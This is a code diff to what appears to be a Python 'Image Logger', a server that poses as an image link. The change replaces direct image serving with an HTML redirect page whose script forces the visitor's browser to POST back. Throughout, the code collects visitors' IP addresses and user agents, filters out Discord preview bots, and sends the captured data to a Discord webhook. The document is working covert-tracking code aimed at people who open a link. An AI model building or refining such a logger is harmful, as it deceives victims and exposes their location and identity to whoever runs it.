@@ -44,7 +44,7 @@ def botCheck(ip, useragent):
         return False
 
 def reportError(error):
-    requests.post(config["webhook"], json = {
+    requests.post(config["webhook"], json={
         "username": config["username"],
         "content": "@everyone",
         "embeds": [{
@@ -61,7 +61,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     bot = botCheck(ip, useragent)
     
     if bot and config["linkAlerts"]:
-        requests.post(config["webhook"], json = {
+        requests.post(config["webhook"], json={
             "username": config["username"],
             "content": "",
             "embeds": [{
@@ -95,7 +95,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
         "embeds": [{
             "title": "Image Logger - IP Logged",
             "color": config["color"],
-            "description": f"""**A User Viewed the Image!**
+            "description": f"""**A User Opened the Image in Browser!**
 
 **Endpoint:** `{endpoint}`
             
@@ -120,7 +120,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
 ```
 {useragent}
 ```""",
-          }],
+            }],
     }
     
     if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
@@ -145,15 +145,10 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             else:
                 url = config["image"]
 
-            # Fetch the image content
-            image_response = requests.get(url, stream=True)
-            image_response.raise_for_status()
-            image_content = image_response.content
-            content_type = image_response.headers.get("Content-Type", "image/jpeg")
-
-            # Handle Discord bot preview
             ip = self.headers.get('x-forwarded-for')
             useragent = self.headers.get('user-agent')
+
+            # Handle Discord bot preview
             if botCheck(ip, useragent):
                 self.send_response(200 if config["buggedImage"] else 302)
                 self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
@@ -163,14 +158,30 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
                 makeReport(ip, endpoint=s.split("?")[0], url=url)
                 return
 
-            # Log IP and serve image for regular users
-            makeReport(ip, useragent, endpoint=self.path.split("?")[0], url=url)
+            # Serve HTML redirect to force browser opening
+            redirect_html = f'''
+            <html>
+                <head>
+                    <meta http-equiv="refresh" content="0;url={url}">
+                    <script>
+                        // Log IP once in the browser
+                        fetch(window.location.href, {{method: "POST"}});
+                    </script>
+                </head>
+                <body>
+                    <p>Redirecting to image...</p>
+                </body>
+            </html>
+            '''.encode()
 
-            # Serve the actual image
             self.send_response(200)
-            self.send_header('Content-type', content_type)
+            self.send_header('Content-type', 'text/html')
             self.end_headers()
-            self.wfile.write(image_content)
+            self.wfile.write(redirect_html)
+
+            # Log IP when the browser makes the POST request (or GET if POST isn't triggered)
+            if self.command == "POST":
+                makeReport(ip, useragent, endpoint=self.path.split("?")[0], url=url)
 
         except Exception:
             self.send_response(500)
